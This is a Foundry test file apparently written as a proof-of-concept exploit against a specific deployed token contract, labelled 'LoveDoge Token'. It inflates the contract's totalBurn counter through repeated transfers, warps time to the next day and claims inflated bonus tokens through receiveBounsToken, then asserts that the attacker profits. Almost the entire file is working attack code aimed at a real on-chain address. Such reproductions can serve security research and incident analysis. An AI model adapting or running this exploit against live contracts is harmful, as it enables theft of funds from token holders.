pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMyCoinToken {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalBurn() external view returns (uint256);
    function receiveBounsToken() external returns (uint256);
    function decimals() external pure returns (uint8);
    function bounsTime() external view returns (uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);
    IMyCoinToken token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IMyCoinToken(TARGET);
        vm.label(TARGET, "LoveDoge Token");
        deal(TARGET, address(this), 100_000_000 * 1e9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = token.balanceOf(address(this));
        console.log("Initial balance:", initialBalance);

        // Create a dummy recipient (non-admin, non-pair)
        address dummy = address(0xdeadbeef);
        vm.label(dummy, "Dummy Recipient");

        // Warp to day 1 for transfers (use a date before bounsTime initially)
        vm.warp(1625000000);
        console.log("Transfer day timestamp:", block.timestamp);

        // Transfer tokens multiple times to accumulate totalBurn
        // Each transfer: 2% burn + 2% term + 6% bouns = 10% fees
        uint256 transferAmount = 50_000_000_000 * 1e9; // 50 billion per transfer
        for (uint i = 0; i < 3; i++) {
            token.transfer(dummy, transferAmount);
            console.log("Transfer", i, "completed. totalBurn:", token.totalBurn());
        }

        console.log("After transfers - Attacker balance:", token.balanceOf(address(this)));
        console.log("After transfers - totalBurn:", token.totalBurn());

        // Warp to day 2 (next day) for bonus claim - must be after bounsTime AND different date
        vm.warp(1625100000); // Different date, after bounsTime (1625068800)
        console.log("Bonus claim day timestamp:", block.timestamp);
        console.log("bounsTime:", token.bounsTime());

        // Claim bonus tokens - rewards are inflated due to artificial totalBurn
        uint256 bonusReceived = token.receiveBounsToken();
        console.log("Bonus received:", bonusReceived);

        uint256 finalBalance = token.balanceOf(address(this));
        console.log("Final balance:", finalBalance);

        // Verify profit
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

